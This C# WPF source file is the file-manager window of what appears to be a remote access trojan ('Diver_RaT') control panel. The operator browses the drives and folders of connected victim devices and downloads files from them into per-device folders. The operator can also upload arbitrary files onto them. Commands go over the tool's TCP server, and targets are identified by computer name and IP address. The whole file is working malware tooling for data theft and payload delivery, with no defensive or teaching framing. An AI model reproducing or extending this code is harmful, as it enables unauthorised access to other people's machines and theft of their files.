using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class FileManagerWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly ObservableCollection<RemoteFileInfo> _files = new();
        private readonly ObservableCollection<string> _paths = new();
        private bool _busy;

        public FileManagerWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"File Manager - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            FileList.ItemsSource = _files;
            PathCombo.ItemsSource = _paths;

            _ = LoadDrives();
        }

        private async System.Threading.Tasks.Task LoadDrives()
        {
            SetBusy(true);
            StatusText.Text = "Detecting drives...";
            var result = await _server.SendCommandAsync(_device.Id, "LIST_DRIVES", timeoutMs: 15000);

            if (!result.Success)
            {
                StatusText.Text = $"Could not list drives: {result.Error}";
                SetBusy(false);
                return;
            }

            _paths.Clear();
            try
            {
                using var doc = JsonDocument.Parse(result.Result ?? "[]");
                foreach (var e in doc.RootElement.EnumerateArray())
                {
                    var path = e.TryGetProperty("path", out var p) ? p.GetString() : null;
                    if (!string.IsNullOrEmpty(path)) _paths.Add(path);
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Invalid drive list: {ex.Message}";
                SetBusy(false);
                return;
            }

            PathCombo.Text = _paths.Count > 0 ? _paths[0] : @"C:\";
            SetBusy(false);
            await LoadDirectory(PathCombo.Text);
        }

        private void UpButton_Click(object sender, RoutedEventArgs e)
        {
            var parent = ParentRemote(PathCombo.Text.Trim());
            if (parent != null) _ = LoadDirectory(parent);
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = LoadDirectory(PathCombo.Text.Trim());

        private void GoButton_Click(object sender, RoutedEventArgs e) => _ = LoadDirectory(PathCombo.Text.Trim());

        private void PathCombo_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                e.Handled = true;
                _ = LoadDirectory(PathCombo.Text.Trim());
            }
        }

        private async void PathCombo_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            if (PathCombo.SelectedItem is string path && !string.IsNullOrWhiteSpace(path))
                await LoadDirectory(path);
        }

        private void FileList_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (FileList.SelectedItem is RemoteFileInfo { Kind: "Folder" } folder)
                _ = LoadDirectory(JoinRemote(PathCombo.Text.Trim(), folder.Name));
        }

        private async void DownloadButton_Click(object sender, RoutedEventArgs e)
        {
            if (FileList.SelectedItem is not RemoteFileInfo file || file.Kind != "File") return;
            if (file.Size > 20 * 1024 * 1024)
            {
                StatusText.Text = "File too large (limit 20 MB for download).";
                return;
            }

            var deviceDir = DownloadSink.DeviceFolder(this, _device.ComputerName);
            if (string.IsNullOrEmpty(deviceDir)) return;
            var targetDir = Path.Combine(deviceDir, "downloads");
            Directory.CreateDirectory(targetDir);
            var target = Path.Combine(targetDir, file.Name);

            SetBusy(true);
            StatusText.Text = $"Downloading {file.Name}...";
            var result = await _server.SendCommandAsync(_device.Id, "DOWNLOAD",
                new System.Collections.Generic.Dictionary<string, string>
                {
                    ["path"] = JoinRemote(PathCombo.Text.Trim(), file.Name)
                }, timeoutMs: 30000);

            try
            {
                if (result.Success && !string.IsNullOrEmpty(result.Result))
                {
                    var bytes = Convert.FromBase64String(result.Result);
                    await File.WriteAllBytesAsync(target, bytes);
                    StatusText.Text = $"Saved {file.Name} ({bytes.Length:N0} bytes) -> {target}";
                }
                else
                {
                    StatusText.Text = $"Download failed: {result.Error}";
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Download failed: {ex.Message}";
            }
            finally
            {
                SetBusy(false);
            }
        }

        private async void UploadButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFileDialog();
            if (dlg.ShowDialog(this) != true) return;

            var info = new FileInfo(dlg.FileName);
            if (info.Length > 20 * 1024 * 1024)
            {
                StatusText.Text = "File too large (limit 20 MB for upload).";
                return;
            }

            var target = JoinRemote(PathCombo.Text.Trim(), info.Name);
            SetBusy(true);
            StatusText.Text = $"Uploading {info.Name}...";
            try
            {
                var bytes = await File.ReadAllBytesAsync(dlg.FileName);
                var result = await _server.SendCommandAsync(_device.Id, "UPLOAD",
                    new System.Collections.Generic.Dictionary<string, string>
                    {
                        ["path"] = target,
                        ["data"] = Convert.ToBase64String(bytes)
                    }, timeoutMs: 60000);
                StatusText.Text = result.Success
                    ? $"Uploaded {info.Name} to {target}."
                    : $"Upload failed: {result.Error}";
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Upload failed: {ex.Message}";
            }
            finally
            {
                SetBusy(false);
            }
        }

        private async System.Threading.Tasks.Task LoadDirectory(string path)
        {
            if (_busy) return;
            SetBusy(true);
            StatusText.Text = $"Loading {path}...";
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_DIR",
                    new System.Collections.Generic.Dictionary<string, string> { ["path"] = path }, timeoutMs: 15000);

                if (!result.Success)
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }

                using var doc = JsonDocument.Parse(result.Result ?? "{}");
                var root = doc.RootElement;
                if (root.TryGetProperty("path", out var p) && p.GetString() is { } realPath)
                    PathCombo.Text = realPath;

                _files.Clear();
                if (root.TryGetProperty("entries", out var entries))
                {
                    foreach (var entry in entries.EnumerateArray())
                    {
                        _files.Add(new RemoteFileInfo
                        {
                            Name = entry.GetProperty("name").GetString() ?? "",
                            Kind = entry.GetProperty("kind").GetString() == "Folder" ? "Folder" : "File",
                            Size = entry.TryGetProperty("size", out var s) ? s.GetInt64() : 0
                        });
                    }
                }

                if (root.TryGetProperty("error", out var err) && !string.IsNullOrEmpty(err.GetString()))
                {
                    StatusText.Text = err.GetString();
                }
                else
                {
                    StatusText.Text = $"{path} - {_files.Count} items";
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Failed to load {path}: {ex.Message}";
            }
            finally
            {
                SetBusy(false);
            }
        }

        private void SetBusy(bool busy)
        {
            _busy = busy;
            UpButton.IsEnabled = !busy;
            RefreshButton.IsEnabled = !busy;
            DownloadButton.IsEnabled = !busy;
            UploadButton.IsEnabled = !busy;
            GoButton.IsEnabled = !busy;
        }

        // POSIX (Android/Linux) path helpers - do NOT use Windows Path.* on remote paths
        private static string JoinRemote(string basePath, string name) =>
            (basePath ?? "").TrimEnd('/') + "/" + (name ?? "").TrimStart('/');

        private static string ParentRemote(string path)
        {
            var p = (path ?? "").TrimEnd('/');
            if (p.Length == 0) return "/";
            var idx = p.LastIndexOf('/');
            return idx <= 0 ? "/" : p[..idx];
        }
    }

    public class RemoteFileInfo
    {
        public string Name { get; set; } = "";
        public string Kind { get; set; } = "File";
        public long Size { get; set; }
        public ImageSource IconSource => IconHelper.GetIcon(Name, Kind == "Folder");
        public string SizeText => Kind == "Folder" ? "" : FormatSize(Size);

        private static string FormatSize(long bytes)
        {
            if (bytes < 1024) return $"{bytes} B";
            if (bytes < 1024 * 1024) return $"{bytes / 1024.0:0.0} KB";
            if (bytes < 1024 * 1024 * 1024) return $"{bytes / (1024.0 * 1024):0.0} MB";
            return $"{bytes / (1024.0 * 1024 * 1024):0.0} GB";
        }
    }
}
